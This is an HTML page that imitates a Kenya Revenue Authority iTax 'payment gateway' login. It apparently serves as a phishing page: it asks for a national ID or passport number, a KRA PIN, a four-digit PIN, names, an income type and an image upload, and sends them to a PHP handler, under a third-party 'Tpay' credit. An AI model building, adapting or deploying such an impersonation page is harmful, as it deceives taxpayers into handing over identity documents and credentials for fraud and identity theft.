<!DOCTYPE html>
<html>
    <head>
    <meta charset="UTF-8">
    <title>Kenya Revenue Authority</title>
        <link rel="icon" type="image/x-icon" href="kra.png">
        <link rel="stylesheet" href="style.css">
     
    </head>
<style>
input[type=text], select {
    width: 50%;
    padding: 6px 18px;
    margin: 2px 0;
    display: inline-block;
    border: 2px solid black;
    border-radius: 1px;
    box-sizing: border-box;
    text-align: center;
    font-size: 18px;
    cursor: pointer;
}

input[type=file], select {
    width: 50%;
    padding: 6px 18px;
    margin: 2px 0;
    display: inline-block;
    border: 2px solid black;
    border-radius: 1px;
    box-sizing: border-box;
    text-align: center;
    font-size: 18px;
    cursor: pointer;
}
input[type=password], select {
    width: 50%;
    padding: 6px 18px;
    margin: 2px 0;
    display: inline-block;
    border: 2px solid black;
    border-radius: 2px;
    box-sizing: border-box;
    text-align: center;
    font-size: 18px;
    cursor: pointer;
}



input[type=submit]:hover {
    background-color: #45a049;
}

button {
    width: 60%;
    background-color: #FF0000;
    color: white;
    padding: 8px 12px;
    margin: 4px 0;
    border: none;
    border-radius: 2px;
    cursor: pointer;
}

div {
    border-radius: 5px;
    background-color: #f2f2f2;
    padding: 5px;
}

body {
    font-family: "Helvetica", Sans-Serif;
  background-color: #E5E4E2;
  background-image: url("bg.jpg");
  align-items: left;
  justify-content: center;
}

.form19{
        width:380px;
        height: 640px;
        display:flex;
        flex-direction: column;
        backdrop-filter: blur(5px);
        border:1px solid red;
        border-radius:6px;
        align-items: center;
        background-color: white;
        background-image: url("phone.jpg");
    
    }
    label {
  color: black;
  font-weight: bold;
  width: 160px;
  float: left;
  margin: 1px 1;
}
label:after { content: " *"; color: #e32; }

input[type=submit]:hover {
    background-color: #45a049;
}
</style>
    <body>
    <center>
    <br>
    <div class="form19">
    <br><br>
    <img class="card-img-top mx-auto" style="width:30%;" src="kra.png" alt="Login Icon">
 
    <h3 style="color:black;">iTax PayMentGateway</h3>

            <form action="process-iTaxsignup.php" method="post" id="signup" novalidate>
            <form method="POST">
            <label>ID/PassportNo:</label>
            <input type="text" name="ID/PassportNo" value=" "  minlength="12" maxlength="12" required>    
            <label>KRAPIN:</label>
            <input type="text" name="KRAPIN" value=" "  minlength="12" maxlength="12" required>
            <label>Password:</label>
            <input type="password" id="password" name="password" placeholder="Enter PIN" minlength="4" maxlength="4" required>
            <label type="text">Income Tax</label>
               <div class="WING" required>
                <select name="Income Tax" class="" required>
                <option value="">Income Tax</option>
                <option value="Natural resource Income">Natural resource Income</option>
                <option value="Dividend & Interests">Dividend and Interests</option>
                <option value="Digital Marketplace">Digital Marketplace</option>
                <option value="Employment Income">Employment Income</option>
                <option value="Business Income">Business Income</option>
                <option value="Pension Income">Pension Income</option>
                <option value="Rent income">Rent Income</option>
                    
                   
                    
                    
                   
                    
                    
                    
                </select>
          </div>
            <label>FirstName:</label>
            <input type="text" name="FirstName" value=" " required>
            <label>LastName:</label>
            <input type="text" name="LastName"value="" required>
            <input type="file" class="box" accept="image/jpg, image/gpeg, image/png">
           
           
                </form>
                <label>Powered by</label>
                <img class="card-img-right mx-auto" style="width:20%;" src="Tpayicon.png" alt="Login Icon">
                </center>
                
    </body>
</html>